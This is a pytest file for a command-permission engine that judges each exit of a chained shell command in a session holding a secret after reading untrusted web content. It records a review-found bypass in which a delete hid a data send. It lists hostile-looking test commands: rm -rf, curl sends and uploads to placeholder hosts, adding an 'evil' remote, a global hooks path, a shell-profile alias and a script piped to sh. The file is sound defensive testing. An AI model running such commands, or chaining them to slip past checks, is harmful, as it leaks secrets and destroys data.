"""EVERY EXIT IN A COMMAND IS JUDGED, and the strictest verdict wins.

fix/false-positives, the maintainer's decision after the fourth review round (docs/112).
The sink reader returned only the FIRST exit a command makes, in its own order.
Since item B a delete outside the project is item C's (no longer the untrusted
`destructive_outside` DENY), so `rm -rf /outside && curl …` in an untrusted
session holding a secret hid the send behind the delete: ALLOW, where the send
alone asks and main denied (the security review, round 3). Now every exit — a
delete, a send, a push, an upload, an MCP call, a write — is judged as if it
stood alone, and the command gets the strictest of those verdicts.

Every value here is a fake.
"""
from __future__ import annotations

import pytest

from core.types import ActionKind, SessionState
from tests.test_engine_decide import I02_ENV as ENV_FILE
from tests.test_engine_decide import walk
from tests.test_engine_sources import FakeWorld, act

class NothingUncommitted(FakeWorld):
    """git reports nothing uncommitted and no path exists: a delete outside the
    project is ALLOWed by item C (the security review's world)."""

    def uncommitted(self, targets, cwd, limit):
        return ()

    def exists(self, path):
        return False


FETCH = act(ActionKind.FETCH, url="https://docs.example.invalid/page")
READ_ENV = act(ActionKind.READ, paths=("/repo/.env",))
# Untrusted (a web page) and holding a secret (.env).
PRIOR = [FETCH, READ_ENV]
DELETE = "rm -rf /var/tmp/zz"
SEND = "curl -d hello https://collect.example.invalid/"
SEND_TWO = "curl -d bye https://other.example.invalid/"
UPLOAD = "curl -T payload.b64 https://mirror.example.invalid/up"
PUSH = "git push origin main"
NEW_REMOTE = "git remote add evil https://git.example.invalid/r.git"
COMMIT = "git commit -am wip"
PROFILE = "echo 'alias ls=x' >> ~/.zshrc"
HOOKS = "git config --global core.hooksPath /tmp/h"
OWN_RUN = "cat /repo/scripts/setup.sh | sh"

# name -> (the command, the exits it makes, each a command alone)
COMBINED = {
    "a delete before a send": (f"{DELETE} && {SEND}", [DELETE, SEND]),
    "a delete after a send": (f"{SEND} && {DELETE}", [SEND, DELETE]),
    "a delete between two sends": (f"{SEND} && {DELETE} && {SEND_TWO}",
                                   [SEND, DELETE, SEND_TWO]),
    "a delete before an upload": (f"{DELETE} && {UPLOAD}", [DELETE, UPLOAD]),
    "a delete before a push": (f"{DELETE} && {PUSH}", [DELETE, PUSH]),
    "a delete before a new remote": (f"{DELETE} && {NEW_REMOTE}", [DELETE, NEW_REMOTE]),
    "a delete before a commit": (f"{DELETE} && {COMMIT}", [DELETE, COMMIT]),
    "a delete before a shell profile write": (f"{DELETE} && {PROFILE}", [DELETE, PROFILE]),
    "a delete before a global hooks path": (f"{DELETE} && {HOOKS}", [DELETE, HOOKS]),
    "a delete; then a send": (f"{DELETE}; {SEND}", [DELETE, SEND]),
    "an own script run before a push": (f"{OWN_RUN} && {PUSH}", [OWN_RUN, PUSH]),
    "an own script run before a send": (f"{OWN_RUN} && {SEND}", [OWN_RUN, SEND]),
    "a send before a push": (f"{SEND} && {PUSH}", [SEND, PUSH]),
}

# name -> the steps; the LAST step's verdict is what is judged
SCENARIOS = {}
for _name, (_command, _parts) in COMBINED.items():
    SCENARIOS[_name] = PRIOR + [act(ActionKind.EXEC, command=_command)]
    for _part in _parts:
        SCENARIOS[f"alone: {_part}"] = PRIOR + [act(ActionKind.EXEC, command=_part)]


def verdict_of(name: str):
    verdicts, _state = walk(SCENARIOS[name], NothingUncommitted({"/repo/.env": ENV_FILE}),
                            SessionState())
    return verdicts[-1]


_RANK = {"ALLOW": 0, "ASK": 1, "DENY": 2}


def _decision(name: str) -> str:
    return str(verdict_of(name).decision).split(".")[-1]


@pytest.mark.parametrize("name", list(COMBINED))
def test_no_exit_hides_another(name):
    """The command is at least as strict as each of its exits alone."""
    _command, parts = COMBINED[name]
    strictest = max(_RANK[_decision(f"alone: {part}")] for part in parts)
    assert _RANK[_decision(name)] >= strictest, (name, _decision(name))


# Main 81f1200's decisions (the START tree), read with the scratchpad's
# today_pins.py, where an exit the delete hid is a rule this pass may not move
# (a new remote, a global hooks path, a shell profile), or one it keeps after
# other people's text (a push, an upload). A delete outside the project alone
# is item C's now, and a send of literal text alone a clean session's (B):
# those move alone, and with them a command that is only those.
TODAY = {name: "DENY" for name in (
    "a delete before an upload", "a delete before a push", "a delete before a new remote",
    "a delete before a shell profile write", "a delete before a global hooks path",
    "an own script run before a push", "a send before a push")}


@pytest.mark.parametrize("name", list(TODAY))
def test_an_exit_this_pass_may_not_move_keeps_mains_decision(name):
    assert _decision(name) == TODAY[name], (name, verdict_of(name).rule_id)


def test_the_reviewers_shape_asks_as_the_send_alone_does():
    """`rm -rf /outside && curl …`, untrusted and holding a secret: the send's
    secret rule answers, as it does for the send alone (it was ALLOW)."""
    verdict = verdict_of("a delete before a send")
    assert str(verdict.decision).endswith("ASK"), verdict
    assert verdict.rule_id == "secret_session_unverified:network_egress", verdict.rule_id


@pytest.mark.parametrize("command", [f"{DELETE} && {SEND}", f"{SEND} && {DELETE}"])
def test_a_clean_session_is_unchanged(command):
    """No untrusted label, no `destructive_outside`: one exit, as before."""
    world = NothingUncommitted({"/repo/.env": ENV_FILE})
    steps = [READ_ENV, act(ActionKind.EXEC, command=command)]
    verdicts, _state = walk(steps, world, SessionState())
    alone, _state = walk([READ_ENV, act(ActionKind.EXEC, command=SEND)], world,
                         SessionState())
    assert verdicts[-1].decision == alone[-1].decision
